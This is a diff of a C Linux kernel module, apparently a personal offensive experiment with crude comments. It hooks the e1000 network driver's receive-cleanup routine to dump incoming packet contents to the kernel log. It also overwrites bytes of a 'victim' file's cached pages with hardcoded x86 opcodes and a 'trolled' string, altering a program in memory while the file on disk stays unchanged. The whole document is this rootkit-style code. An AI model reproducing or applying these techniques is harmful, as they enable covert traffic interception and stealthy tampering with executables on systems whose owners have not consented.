@@ -17,39 +17,48 @@ const char* net_adapter = "e1000";
 #define STRINGIFY(A) #A
 #define TOSTRING(A) STRINGIFY(A) //I don't why the fuck this works. If I had to take a guess, it is because when you pass in A in TOSTRING, you pass in the value of A which is then stringifyed.
 
-const char* troll = "trolled";
 
+
+struct e1000_adapter* e1000;
+
+bool (*old_clean_rx)(struct e1000_adapter* adapter, struct e1000_rx_ring* rx_ring, int* work_done, int work_to_do);
+//old_clean_rx is always e1000_clean_rx_irq if we are using standard sized frames
+
+bool new_clean_rx(struct e1000_adapter* adapter, struct e1000_rx_ring* rx_ring, int* work_done, int work_to_do){
+  int j;
+  printk(KERN_INFO "Clean rx\n");
+  struct e1000_rx_desc *rx_desc = E1000_RX_DESC(*rx_ring, rx_ring->next_to_clean);
+	struct e1000_rx_buffer *buffer_info = &rx_ring->buffer_info[rx_ring->next_to_clean];
+
+	  
+    for(j = 0; j<rx_desc->length; j++){
+      pr_info("%c\n", *((char*)(buffer_info->rxbuf.data + NET_SKB_PAD + NET_IP_ALIGN + j))); //i have no fucking clue what this does
+    }
+  return old_clean_rx(adapter, rx_ring, work_done, work_to_do); //LULW
+}
+
+
+
+const char* troll = "trolled";
 struct inode* i;
 struct page* old_opcode;
 struct page* new_opcode;
 struct page* old_troll;
 struct page* new_troll;
-
-struct e1000_adapter* e1000;
-
-bool (*old_clean_rx)(struct e1000_adapter* adapter, struct e1000_rx_ring* rx_ring, int* work_done, int work_to_do);
-
-
-bool new_clean_rx(struct e1000_adapter* adapter, struct e1000_rx_ring* rx_ring, int* work_done, int work_to_do){
-  return old_clean_rx(adapter, rx_ring, work_done, work_to_do); //LULW
-}
-
 char trolling_opcodes[] = { 0x48, 0x8D, 0x35, 0x10, 0x94, 0x08, 0x00, 0x48, 0xC7, 0xC2, 0x08, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00 }  ; //append with a shit ton of nops
-int init_module(void)
-{
-  
-  printk(KERN_INFO "Printing out pci devices\n");
+
+void page_cache_test(void){
   char* path = VICTIM_FILE_OVERRIDE;
   i = get_file_path(path);//
   if(!i){
     printk(KERN_INFO "Invalid path\n");
-    return 0;
+    return;
   }
   printk(KERN_INFO "Path Succeeded\n");
 
   if(i -> i_mapping == NULL){
     printk(KERN_INFO "This page does not have an address_space object - it is likely not file-mapped\n");
-    return 0;
+    return;
   }
   printk(KERN_INFO "This page has an address_space object - it is likely file-mapped\n");
 
@@ -60,56 +69,13 @@ int init_module(void)
   write_string_page_cache(i, 0x00107c10, trolling_opcodes, 21, &new_opcode, &old_opcode);
   
 
-  if(old_troll){
-    printk(KERN_INFO "old_troll refcount: %d\n", page_ref_count(old_troll));
-    printk(KERN_INFO "old_troll mapcount: %d\n", atomic_read(&old_troll -> _mapcount));
-  }else{
-    printk(KERN_INFO "old_troll is null\n");
-  }
-
-  if(new_troll){
-    printk(KERN_INFO "new_troll refcount: %d\n", page_ref_count(new_troll));
-    printk(KERN_INFO "new_troll mapcount: %d\n", atomic_read(&new_troll -> _mapcount));
-  }else{
-    printk(KERN_INFO "new_troll is null\n");
-  }
+}
 
 
-  if(old_opcode){
-    printk(KERN_INFO "old_opcode refcount: %d\n", page_ref_count(old_opcode));
-    printk(KERN_INFO "old_opcode mapcount: %d\n", atomic_read(&old_opcode -> _mapcount));
-  }else{
-    printk(KERN_INFO "old_opcode is null\n");
-  }
-
-  if(new_opcode){
-    printk(KERN_INFO "new_opcode refcount: %d\n", page_ref_count(new_opcode));
-    printk(KERN_INFO "new_opcode mapcount: %d\n", atomic_read(&new_opcode -> _mapcount));
-  }else{
-    printk(KERN_INFO "new_opcode is null\n");
-  }
-
+int init_module(void)
+{
   
-
-
-
-  //remove_page(i, 0x00107c10); //extraction confirmed
-  //remove_page(i, 0x00191027);
-
-
-
-
-
-
-
-
-
-
-
-  //enumerate_pci();
-  //printk(KERN_INFO "%lx\n", (unsigned long)net_adapter);
-  //printk(KERN_INFO "%s\n", net_adapter);
-  /*struct pci_dev* pd = find_pci(net_adapter, 5);
+  struct pci_dev* pd = find_pci(net_adapter, 5);
   
   if(pd){
     printk("pci name: %s\n", get_dev_name(pd));
@@ -140,57 +106,17 @@ int init_module(void)
   
   e1000->clean_rx = new_clean_rx; //add new, shitty clean_rx*/
 
-  /*if(e1000 -> pdev == pd && e1000 -> netdev == nd){
-    printk(KERN_INFO "This is indeed the e1000\n");
-  }else{
-    printk(KERN_INFO "This is not the e1000\n");
-    return 0;
-  }
-  struct e1000_rx_ring* rx_ring= e1000->rx_ring;
-  
-  if(!rx_ring){
-    printk(KERN_INFO "Not a valid rx ring\n");
-    return 0;
-  }
 
-  //e1000_dump(e1000);
-  int j;
-  
-    
-   // This code is diagnositc code copied from line #3446 in e1000_main.c on the latest version of the linux kernel
-    
-  struct e1000_rx_desc *rx_desc = E1000_RX_DESC(*rx_ring, rx_ring->next_to_clean);
-	struct e1000_rx_buffer *buffer_info = &rx_ring->buffer_info[rx_ring->next_to_clean];
-
-	
-    pr_info("Current NTU: %d\n", rx_ring->next_to_use);
-    for(j = 0; j<E1000_RXBUFFER_2048; j++){
-      pr_info("%c\n", *((char*)(buffer_info->rxbuf.data + NET_SKB_PAD + NET_IP_ALIGN + j))); //i have no fucking clue what this does
-    }*/
-    
-
-
+  printk(KERN_INFO "clean_rx replaced\n");
 
   return 0;
 }
 void cleanup_module(void)
 {
+
+  e1000->clean_rx = old_clean_rx;
   //replace_page(new_opcode, old_opcode);
-  //replace_page(new_troll, old_troll); //flipped around because
-  
-
-  /*if(!old_opcode){
-    printk(KERN_INFO "Old opcode has been evicted\n");
-  }
-
-  if(!old_troll){
-    printk(KERN_INFO "Old troll has been evicted\n");
-  }*/
-
-  
-  
-  remove_page(i, 0x00107c10); //extraction confirmed
-  remove_page(i, 0x00191027);
+  //replace_page(new_troll, old_troll); //flipped around because old is the new now. 
 
 
 	printk("Module cleanup\n");
